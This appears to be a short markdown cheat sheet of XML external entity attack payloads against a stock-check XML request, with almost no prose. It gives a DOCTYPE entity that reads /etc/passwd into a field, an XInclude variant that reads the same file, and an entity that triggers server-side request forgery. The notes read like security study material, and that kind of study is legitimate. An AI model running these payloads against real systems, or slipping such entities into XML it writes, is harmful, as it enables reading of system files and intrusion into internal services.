### XML external entity example
```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>
```

### injected - parameter &xxe; and read passwd file (could also be placed in another element)
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]> 
<stockCheck><productId>&xxe;</productId></stockCheck>
```

### another variant (if you can not control the complete XML)
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

### another example - perform SSRF
```
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://example.com.com/some/path"> ]>
```

